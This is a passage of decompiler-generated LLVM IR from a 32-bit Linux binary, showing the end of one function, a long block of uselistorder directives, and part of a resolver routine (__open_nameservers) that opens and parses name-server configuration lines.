  br label %dec_label_pc_805345e

dec_label_pc_805345e:                             ; preds = %dec_label_pc_8053448.dec_label_pc_805345e_crit_edge, %dec_label_pc_805344f
  %v1_8053465.pre-phi = phi i32 [ %.pre, %dec_label_pc_8053448.dec_label_pc_805345e_crit_edge ], [ %v1_8053456, %dec_label_pc_805344f ]
  %v0_805345e = phi i32 [ %v0_8053448, %dec_label_pc_8053448.dec_label_pc_805345e_crit_edge ], [ %v1_805345b, %dec_label_pc_805344f ]
  %v1_8053461 = add i32 %v0_805345e, 12
  %v2_8053461 = inttoptr i32 %v1_8053461 to i32*
  %v3_8053461 = load i32, i32* %v2_8053461, align 4
  %v5_8053461 = add i32 %v0_805345e, -16
  %v6_8053461 = inttoptr i32 %v5_8053461 to i32*
  store i32 %v3_8053461, i32* %v6_8053461, align 4
  %v2_8053465 = call i32 @free(i32 %v1_8053465.pre-phi)
  store i32 %v2_8053465, i32* %eax.global-to-local, align 4
  %v1_805346a = load i32, i32* @esp, align 4
  %v2_805346a = inttoptr i32 %v1_805346a to i32*
  store i32 %v2_8052da2, i32* %v2_805346a, align 4
  %v2_805346d = call i32 @free(i32 %v1_8053465.pre-phi)
  store i32 %v2_805346d, i32* @eax, align 4
  %v0_8053472 = load i32, i32* @esp, align 4
  %v1_8053475 = add i32 %v0_8053472, 56
  %v2_8053475 = inttoptr i32 %v1_8053475 to i32*
  %v3_8053475 = load i32, i32* %v2_8053475, align 4
  %v13_8053475 = icmp eq i32 %v3_8053475, -1
  %v1_805347a = add i32 %v0_8053472, 32
  %v2_805347a = inttoptr i32 %v1_805347a to i32*
  store i32 -1, i32* %v2_805347a, align 4
  br i1 %v13_8053475, label %dec_label_pc_805345e.dec_label_pc_80534d1_crit_edge, label %dec_label_pc_8053484

dec_label_pc_805345e.dec_label_pc_80534d1_crit_edge: ; preds = %dec_label_pc_805345e
  %v0_80534d1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80534d1

dec_label_pc_8053484:                             ; preds = %dec_label_pc_805345e
  %v0_8053484 = load i32, i32* @ecx, align 4
  %v1_8053484 = load i32, i32* @esp, align 4
  %v2_8053484 = add i32 %v1_8053484, -4
  %v3_8053484 = inttoptr i32 %v2_8053484 to i32*
  store i32 %v0_8053484, i32* %v3_8053484, align 4
  %v1_8053485 = add i32 %v1_8053484, -8
  %v2_8053485 = inttoptr i32 %v1_8053485 to i32*
  store i32 ptrtoint (i8** @global_var_805e728.231 to i32), i32* %v2_8053485, align 4
  %v1_805348a = add i32 %v1_8053484, -12
  %v2_805348a = inttoptr i32 %v1_805348a to i32*
  store i32 134552147, i32* %v2_805348a, align 4
  %v1_805348f = add i32 %v1_8053484, 184
  store i32 %v1_805348f, i32* %ebx.global-to-local, align 4
  %v2_8053496 = add i32 %v1_8053484, -16
  %v3_8053496 = inttoptr i32 %v2_8053496 to i32*
  store i32 %v1_805348f, i32* %v3_8053496, align 4
  %v3_8053497 = call i32 @__pthread_return_void(i32 %v1_8053465.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053497, i32* %eax.global-to-local, align 4
  %v0_805349c = load i32, i32* @esp, align 4
  %v1_805349c = inttoptr i32 %v0_805349c to i32*
  store i32 ptrtoint (i8** @global_var_805e728.231 to i32), i32* %v1_805349c, align 4
  %v2_80534a3 = call i32 @__pthread_return_0(i32 %v1_8053465.pre-phi)
  store i32 %v2_80534a3, i32* %eax.global-to-local, align 4
  %v0_80534a8 = load i32, i32* @esp, align 4
  %v1_80534a8 = add i32 %v0_80534a8, 60
  %v2_80534a8 = inttoptr i32 %v1_80534a8 to i32*
  %v3_80534a8 = load i32, i32* %v2_80534a8, align 4
  store i32 %v3_80534a8, i32* %eax.global-to-local, align 4
  %v1_80534ac = add i32 %v0_80534a8, 56
  %v2_80534ac = inttoptr i32 %v1_80534ac to i32*
  %v3_80534ac = load i32, i32* %v2_80534ac, align 4
  store i32 %v3_80534ac, i32* %edx.global-to-local, align 4
  %v1_80534b0 = trunc i32 %v3_80534a8 to i16
  store i16 %v1_80534b0, i16* @global_var_8058484.233, align 4
  %v1_80534b6 = inttoptr i32 %v0_80534a8 to i32*
  %v2_80534b6 = load i32, i32* %v1_80534b6, align 4
  store i32 %v2_80534b6, i32* @eax, align 4
  %v3_80534b6 = add i32 %v0_80534a8, 4
  %v1_80534b7 = sext i32 %v3_80534ac to i64
  store i64 %v1_80534b7, i64* @global_var_805e740.232, align 64
  %v1_80534bd = inttoptr i32 %v3_80534b6 to i32*
  %v2_80534bd = load i32, i32* %v1_80534bd, align 4
  store i32 %v2_80534bd, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80534bd, align 4
  %v0_80534c0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80534c0, i32* %v1_80534b6, align 4
  %v3_80534c1 = call i32 @__pthread_return_void(i32 %v1_8053465.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80534c1, i32* %eax.global-to-local, align 4
  %v0_80534c6 = load i32, i32* @esp, align 4
  %v1_80534c6 = add i32 %v0_80534c6, 32
  %v2_80534c6 = inttoptr i32 %v1_80534c6 to i32*
  store i32 -1, i32* %v2_80534c6, align 4
  br label %dec_label_pc_80534ce

dec_label_pc_80534ce:                             ; preds = %dec_label_pc_8053342, %dec_label_pc_8053484
  %v0_80534ce = load i32, i32* @esp, align 4
  %v1_80534ce = add i32 %v0_80534ce, 16
  br label %dec_label_pc_80534d1

dec_label_pc_80534d1:                             ; preds = %dec_label_pc_805345e.dec_label_pc_80534d1_crit_edge, %dec_label_pc_80534ce
  %v0_80534d1 = phi i32 [ %v0_80534d1.pre, %dec_label_pc_805345e.dec_label_pc_80534d1_crit_edge ], [ %v1_80534ce, %dec_label_pc_80534ce ]
  %v1_80534d1 = add i32 %v0_80534d1, 16
  %v2_80534d1 = inttoptr i32 %v1_80534d1 to i32*
  %v3_80534d1 = load i32, i32* %v2_80534d1, align 4
  store i32 %v3_80534d1, i32* %eax.global-to-local, align 4
  %v1_80534d5 = add i32 %v0_80534d1, 220
  %v1_80534db = inttoptr i32 %v1_80534d5 to i32*
  %v2_80534db = load i32, i32* %v1_80534db, align 4
  store i32 %v2_80534db, i32* @ebx, align 4
  %v3_80534db = add i32 %v0_80534d1, 224
  %v1_80534dc = inttoptr i32 %v3_80534db to i32*
  %v2_80534dc = load i32, i32* %v1_80534dc, align 4
  store i32 %v2_80534dc, i32* @esi, align 4
  %v3_80534dc = add i32 %v0_80534d1, 228
  %v1_80534dd = inttoptr i32 %v3_80534dc to i32*
  %v2_80534dd = load i32, i32* %v1_80534dd, align 4
  store i32 %v2_80534dd, i32* @edi, align 4
  %v3_80534dd = add i32 %v0_80534d1, 232
  %v1_80534de = inttoptr i32 %v3_80534dd to i32*
  %v2_80534de = load i32, i32* %v1_80534de, align 4
  store i32 %v2_80534de, i32* @ebp, align 4
  ret i32 %v3_80534d1

; uselistorder directives
  uselistorder i32 %v0_80534d1, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80534a8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805345e, { 1, 0 }
  uselistorder i32 %v1_8053465.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8053410.pre, { 1, 0 }
  uselistorder i32 %v5_80533e3, { 1, 0 }
  uselistorder i32 %v3_80533e3, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80533ab, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8053374, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053342, { 1, 0 }
  uselistorder i32 %v3_8053321, { 1, 0, 2 }
  uselistorder i32 %v0_8053312, { 1, 0 }
  uselistorder i32 %v5_8053308, { 1, 0 }
  uselistorder i32* %v3_8053308, { 1, 0 }
  uselistorder i32 %v0_80531de67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8053308, { 2, 1, 0 }
  uselistorder i32 %v5_8053302, { 1, 0 }
  uselistorder i32 %v1_8053301, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80532fd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80532c1, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_805329b, { 1, 0 }
  uselistorder i32 %v1_805328c, { 1, 0 }
  uselistorder i32 %v3_805325d, { 2, 3, 0, 1 }
  uselistorder i32 %v0_805324b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80531f2, { 1, 2, 0 }
  uselistorder i32 %v0_80531f2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_80531cc, { 1, 0 }
  uselistorder i32 %v0_80531d4, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_80531c2, { 1, 0, 2 }
  uselistorder i32 %v5_805316e, { 1, 0 }
  uselistorder i32* %v2_805316e, { 1, 0, 2 }
  uselistorder i32 %v3_8053126, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805310c, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_80530eb, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80530cb, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8053071, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8053056, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_805303f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052fc7, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052f7a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052f5b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052f3f, { 1, 0 }
  uselistorder i32 %v3_8052f34, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8052f31, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8052ed6, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052ed1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052eba, { 1, 0 }
  uselistorder i32 %v1_8052e86, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8052e7783, { 2, 1, 0 }
  uselistorder i16 %v0_8052e37, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8052e30, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8052da2, { 4, 10, 5, 3, 2, 11, 9, 1, 0, 8, 6, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 7, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 160, { 0, 3, 1, 2 }
  uselistorder i32 68, { 4, 1, 2, 3, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 100, { 0, 4, 2, 3, 1 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 3, 2, 7, 6, 5, 4, 8, 0 }
  uselistorder i32 17, { 12, 9, 5, 8, 2, 3, 1, 0, 13, 4, 11, 10, 6, 7 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i32 84, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 26, 21, 24, 22, 25, 27, 28, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 11, 17, 16, 15, 14, 19, 18, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_8058484.233, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_805e740.232, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805e728.231 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_805e728.231, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80534d1, { 1, 0 }
  uselistorder label %dec_label_pc_80534ce, { 1, 0 }
  uselistorder label %dec_label_pc_805345e, { 1, 0 }
  uselistorder label %dec_label_pc_8053448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053435, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8053410.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053408, { 1, 0 }
  uselistorder label %dec_label_pc_80533ef, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80533a4, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8053342, { 1, 0 }
  uselistorder label %dec_label_pc_8053312, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8053308, { 1, 0 }
  uselistorder label %dec_label_pc_80532fd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80532fa, { 1, 0 }
  uselistorder label %dec_label_pc_8053275, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80531cc, { 1, 0 }
  uselistorder label %dec_label_pc_805303f, { 1, 0 }
  uselistorder label %dec_label_pc_8053008, { 1, 0 }
  uselistorder label %dec_label_pc_8052f7a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052e86, { 1, 0 }
  uselistorder label %dec_label_pc_8052e70, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_80534e0 = load i32, i32* @ebp, align 4
  store i32 134552147, i32* %stack_var_-216, align 4
  %v3_80534ef = ptrtoint i32* %stack_var_-216 to i32
  %v2_80534f4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80534f4, i32* @eax, align 4
  %v2_80534fc = call i32 @__pthread_return_void(i32 %v2_80534f4, i32 134552147)
  %v1_8053508 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058488.173 to i32))
  store i32 %v1_8053508, i32* @eax, align 4
  %v0_8053510 = load i32, i32* @global_var_805eb74.174, align 4
  %tmp41 = icmp slt i32 %v0_8053510, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8053707, label %dec_label_pc_805351d

dec_label_pc_805351d:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8057a50.236 to i32), i32* %stack_var_-216, align 4
  %v2_8053529 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_8057a1e.237 to i32), i32 ptrtoint (i32* @global_var_8057a50.236 to i32))
  store i32 %v2_8053529, i32* @eax, align 4
  %v1_8053531 = icmp eq i32 %v2_8053529, 0
  store i32 %v2_8053529, i32* @ebp, align 4
  %v1_8053535 = icmp eq i1 %v1_8053531, false
  br i1 %v1_8053535, label %dec_label_pc_80536d2.preheader, label %dec_label_pc_805353b

dec_label_pc_805353b:                             ; preds = %dec_label_pc_805351d
  store i32 ptrtoint (i32* @global_var_8057a50.236 to i32), i32* %stack_var_-216, align 4
  %v2_8053547 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_8057a2f.238 to i32), i32 ptrtoint (i32* @global_var_8057a50.236 to i32))
  %v1_805354f = icmp eq i32 %v2_8053547, 0
  store i32 %v2_8053547, i32* @ebp, align 4
  %v1_8053553 = icmp eq i1 %v1_805354f, false
  br i1 %v1_8053553, label %dec_label_pc_80536d2.preheader, label %dec_label_pc_80536fc

dec_label_pc_80536d2.preheader:                   ; preds = %dec_label_pc_805351d, %dec_label_pc_805353b
  %v2_80536d9 = ptrtoint i32* %stack_var_-180 to i32
  %v3_805360d = add i32 %v3_80534ef, 164
  %v4_80535fc = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_80536d2

dec_label_pc_805355e:                             ; preds = %dec_label_pc_8053569
  %v1_805355e = add i32 %v0_805355e56, 1
  store i32 %v1_805355e, i32* @ebx, align 4
  %v1_805355f = inttoptr i32 %v1_805355e to i8*
  %v2_805355f = load i8, i8* %v1_805355f, align 1
  %v3_805355f = zext i8 %v2_805355f to i32
  %v5_805355f = and i32 %v6_805355f59, -256
  %v6_805355f = or i32 %v3_805355f, %v5_805355f
  store i32 %v6_805355f, i32* @ecx, align 4
  %v4_8053561 = icmp eq i8 %v2_805355f, 0
  br i1 %v4_8053561, label %dec_label_pc_80536d2, label %dec_label_pc_8053569

dec_label_pc_8053569:                             ; preds = %dec_label_pc_8053569.lr.ph, %dec_label_pc_805355e
  %v6_805355f59 = phi i32 [ %v6_805355f53, %dec_label_pc_8053569.lr.ph ], [ %v6_805355f, %dec_label_pc_805355e ]
  %v2_805355f58 = phi i8 [ %v2_805355f50, %dec_label_pc_8053569.lr.ph ], [ %v2_805355f, %dec_label_pc_805355e ]
  %v1_805355f57 = phi i8* [ %v1_805355f49, %dec_label_pc_8053569.lr.ph ], [ %v1_805355f, %dec_label_pc_805355e ]
  %v0_805355e56 = phi i32 [ %v0_805355f.pre, %dec_label_pc_8053569.lr.ph ], [ %v1_805355e, %dec_label_pc_805355e ]
  store i32 %v0_8053569.pre, i32* @eax, align 4
  %v2_805356e = sext i8 %v2_805355f58 to i32
  store i32 %v2_805356e, i32* @edx, align 4
  %v2_8053571 = mul nsw i32 %v2_805356e, 2
  %v3_8053571 = add i32 %v0_8053569.pre, %v2_8053571
  %v4_8053571 = inttoptr i32 %v3_8053571 to i8*
  %v5_8053571 = load i8, i8* %v4_8053571, align 1
  %v6_8053571 = and i8 %v5_8053571, 32
  %v7_8053571 = icmp eq i8 %v6_8053571, 0
  %v1_8053575 = icmp eq i1 %v7_8053571, false
  br i1 %v1_8053575, label %dec_label_pc_805355e, label %dec_label_pc_8053577

dec_label_pc_8053577:                             ; preds = %dec_label_pc_8053569
  %v10_8053577 = icmp eq i8 %v2_805355f58, 10
  br i1 %v10_8053577, label %dec_label_pc_80536d2, label %dec_label_pc_8053580

dec_label_pc_8053580:                             ; preds = %dec_label_pc_8053577
  %v10_8053580 = icmp eq i8 %v2_805355f58, 35
  %v1_805358b = icmp eq i1 %v10_8053580, false
  br i1 %v1_805358b, label %dec_label_pc_80535dc.preheader, label %dec_label_pc_80536d2

dec_label_pc_80535dc.preheader:                   ; preds = %dec_label_pc_8053580
  %v2_80535dc6 = load i8, i8* %v1_805355f57, align 1
  %v3_80535dc7 = icmp eq i8 %v2_80535dc6, 0
  br i1 %v3_80535dc7, label %dec_label_pc_80535e8, label %dec_label_pc_80535e1

dec_label_pc_8053592:                             ; preds = %dec_label_pc_80535e1
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8053596 = load i32, i32* @esp, align 4
  %v3_8053596 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8053596 = add nuw nsw i32 %v3_8053596, 152
  %v5_8053596 = add i32 %v4_8053596, %v1_8053596
  %v6_8053596 = inttoptr i32 %v5_8053596 to i32*
  store i32 %v0_8053596, i32* %v6_8053596, align 4
  %v0_80535a0.pre = load i32, i32* @ebx, align 4
  %v4_80535a0.pre = load i32, i32* @ecx, align 4
  %v1_80535a060 = inttoptr i32 %v0_80535a0.pre to i8*
  %v2_80535a061 = load i8, i8* %v1_80535a060, align 1
  %v3_80535a062 = zext i8 %v2_80535a061 to i32
  %v5_80535a063 = and i32 %v4_80535a0.pre, -256
  %v6_80535a064 = or i32 %v3_80535a062, %v5_80535a063
  %v4_80535a265 = icmp eq i8 %v2_80535a061, 0
  br i1 %v4_80535a265, label %dec_label_pc_80535bf.preheader, label %dec_label_pc_80535a6.lr.ph

dec_label_pc_80535a6.lr.ph:                       ; preds = %dec_label_pc_8053592
  %v0_80535a6.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_80535a6

dec_label_pc_805359f:                             ; preds = %dec_label_pc_80535b4
  %v1_805359f = add i32 %v0_805359f67, 1
  store i32 %v1_805359f, i32* @ebx, align 4
  %v1_80535a0 = inttoptr i32 %v1_805359f to i8*
  %v2_80535a0 = load i8, i8* %v1_80535a0, align 1
  %v3_80535a0 = zext i8 %v2_80535a0 to i32
  %v5_80535a0 = and i32 %v6_80535a069, -256
  %v6_80535a0 = or i32 %v3_80535a0, %v5_80535a0
  %v4_80535a2 = icmp eq i8 %v2_80535a0, 0
  br i1 %v4_80535a2, label %dec_label_pc_80535bf.preheader, label %dec_label_pc_80535a6

dec_label_pc_80535a6:                             ; preds = %dec_label_pc_80535a6.lr.ph, %dec_label_pc_805359f
  %v6_80535a069 = phi i32 [ %v6_80535a064, %dec_label_pc_80535a6.lr.ph ], [ %v6_80535a0, %dec_label_pc_805359f ]
  %v2_80535a068 = phi i8 [ %v2_80535a061, %dec_label_pc_80535a6.lr.ph ], [ %v2_80535a0, %dec_label_pc_805359f ]
  %v0_805359f67 = phi i32 [ %v0_80535a0.pre, %dec_label_pc_80535a6.lr.ph ], [ %v1_805359f, %dec_label_pc_805359f ]
  store i32 %v0_80535a6.pre, i32* @eax, align 4
  %v2_80535ab = sext i8 %v2_80535a068 to i32
  store i32 %v2_80535ab, i32* @edx, align 4
  %v2_80535ae = mul nsw i32 %v2_80535ab, 2
  %v3_80535ae = add i32 %v0_80535a6.pre, %v2_80535ae
  %v4_80535ae = inttoptr i32 %v3_80535ae to i8*
  %v5_80535ae = load i8, i8* %v4_80535ae, align 1
  %v6_80535ae = and i8 %v5_80535ae, 32
  %v7_80535ae = icmp eq i8 %v6_80535ae, 0
  %v1_80535b2 = icmp eq i1 %v7_80535ae, false
  br i1 %v1_80535b2, label %dec_label_pc_80535bf.preheader, label %dec_label_pc_80535b4

dec_label_pc_80535b4:                             ; preds = %dec_label_pc_80535a6
  %v10_80535b4 = icmp eq i8 %v2_80535a068, 10
  %v1_80535b7 = icmp eq i1 %v10_80535b4, false
  br i1 %v1_80535b7, label %dec_label_pc_805359f, label %dec_label_pc_80535bf.preheader

dec_label_pc_80535bf.preheader:                   ; preds = %dec_label_pc_80535b4, %dec_label_pc_80535a6, %dec_label_pc_805359f, %dec_label_pc_8053592
  %v0_805359f.lcssa = phi i32 [ %v0_80535a0.pre, %dec_label_pc_8053592 ], [ %v1_805359f, %dec_label_pc_805359f ], [ %v0_805359f67, %dec_label_pc_80535a6 ], [ %v0_805359f67, %dec_label_pc_80535b4 ]
  %v6_80535a0.lcssa = phi i32 [ %v6_80535a064, %dec_label_pc_8053592 ], [ %v6_80535a0, %dec_label_pc_805359f ], [ %v6_80535a069, %dec_label_pc_80535a6 ], [ %v6_80535a069, %dec_label_pc_80535b4 ]
  %v1_80535bf75 = inttoptr i32 %v0_805359f.lcssa to i8*
  %v2_80535bf76 = load i8, i8* %v1_80535bf75, align 1
  %v3_80535bf77 = zext i8 %v2_80535bf76 to i32
  %v5_80535bf78 = and i32 %v6_80535a0.lcssa, -256
  %v6_80535bf79 = or i32 %v3_80535bf77, %v5_80535bf78
  store i32 %v6_80535bf79, i32* @ecx, align 4
  %v4_80535c180 = icmp eq i8 %v2_80535bf76, 0
  br i1 %v4_80535c180, label %dec_label_pc_80535d8, label %dec_label_pc_80535c5

dec_label_pc_80535bb:                             ; preds = %dec_label_pc_80535d3, %dec_label_pc_80535c5
  store i8 0, i8* %v1_80535bf83, align 1
  %v0_80535be = load i32, i32* @ebx, align 4
  %v1_80535be = add i32 %v0_80535be, 1
  store i32 %v1_80535be, i32* @ebx, align 4
  %v4_80535bf.pre = load i32, i32* @ecx, align 4
  %v1_80535bf = inttoptr i32 %v1_80535be to i8*
  %v2_80535bf = load i8, i8* %v1_80535bf, align 1
  %v3_80535bf = zext i8 %v2_80535bf to i32
  %v5_80535bf = and i32 %v4_80535bf.pre, -256
  %v6_80535bf = or i32 %v3_80535bf, %v5_80535bf
  store i32 %v6_80535bf, i32* @ecx, align 4
  %v4_80535c1 = icmp eq i8 %v2_80535bf, 0
  br i1 %v4_80535c1, label %dec_label_pc_80535d8, label %dec_label_pc_80535c5

dec_label_pc_80535c5:                             ; preds = %dec_label_pc_80535bf.preheader, %dec_label_pc_80535bb
  %v2_80535bf84 = phi i8 [ %v2_80535bf, %dec_label_pc_80535bb ], [ %v2_80535bf76, %dec_label_pc_80535bf.preheader ]
  %v1_80535bf83 = phi i8* [ %v1_80535bf, %dec_label_pc_80535bb ], [ %v1_80535bf75, %dec_label_pc_80535bf.preheader ]
  %v0_80535dc82 = phi i32 [ %v1_80535be, %dec_label_pc_80535bb ], [ %v0_805359f.lcssa, %dec_label_pc_80535bf.preheader ]
  %v0_80535c5 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_80535c5, i32* @eax, align 4
  %v2_80535ca = sext i8 %v2_80535bf84 to i32
  store i32 %v2_80535ca, i32* @edx, align 4
  %v2_80535cd = mul nsw i32 %v2_80535ca, 2
  %v3_80535cd = add i32 %v0_80535c5, %v2_80535cd
  %v4_80535cd = inttoptr i32 %v3_80535cd to i8*
  %v5_80535cd = load i8, i8* %v4_80535cd, align 1
  %v6_80535cd = and i8 %v5_80535cd, 32
  %v7_80535cd = icmp eq i8 %v6_80535cd, 0
  %v1_80535d1 = icmp eq i1 %v7_80535cd, false
  br i1 %v1_80535d1, label %dec_label_pc_80535bb, label %dec_label_pc_80535d3

dec_label_pc_80535d3:                             ; preds = %dec_label_pc_80535c5
  %v10_80535d3 = icmp eq i8 %v2_80535bf84, 10
  br i1 %v10_80535d3, label %dec_label_pc_80535bb, label %dec_label_pc_80535d8

dec_label_pc_80535d8:                             ; preds = %dec_label_pc_80535bb, %dec_label_pc_80535d3, %dec_label_pc_80535bf.preheader
  %v0_80535dc.lcssa = phi i32 [ %v0_805359f.lcssa, %dec_label_pc_80535bf.preheader ], [ %v0_80535dc82, %dec_label_pc_80535d3 ], [ %v1_80535be, %dec_label_pc_80535bb ]
  %v1_80535bf.lcssa = phi i8* [ %v1_80535bf75, %dec_label_pc_80535bf.preheader ], [ %v1_80535bf83, %dec_label_pc_80535d3 ], [ %v1_80535bf, %dec_label_pc_80535bb ]
  %v4_80535d8 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_80535dc = load i8, i8* %v1_80535bf.lcssa, align 1
  %v3_80535dc = icmp eq i8 %v2_80535dc, 0
  br i1 %v3_80535dc, label %dec_label_pc_80535e8, label %dec_label_pc_80535e1

dec_label_pc_80535e1:                             ; preds = %dec_label_pc_80535dc.preheader, %dec_label_pc_80535d8
  %v0_8053596 = phi i32 [ %v0_80535dc.lcssa, %dec_label_pc_80535d8 ], [ %v0_805355e56, %dec_label_pc_80535dc.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_80535d8, %dec_label_pc_80535d8 ], [ 0, %dec_label_pc_80535dc.preheader ]
  %v7_80535e6 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_80535e6, label %dec_label_pc_80535e8, label %dec_label_pc_8053592

dec_label_pc_80535e8:                             ; preds = %dec_label_pc_80535d8, %dec_label_pc_80535e1, %dec_label_pc_80535dc.preheader
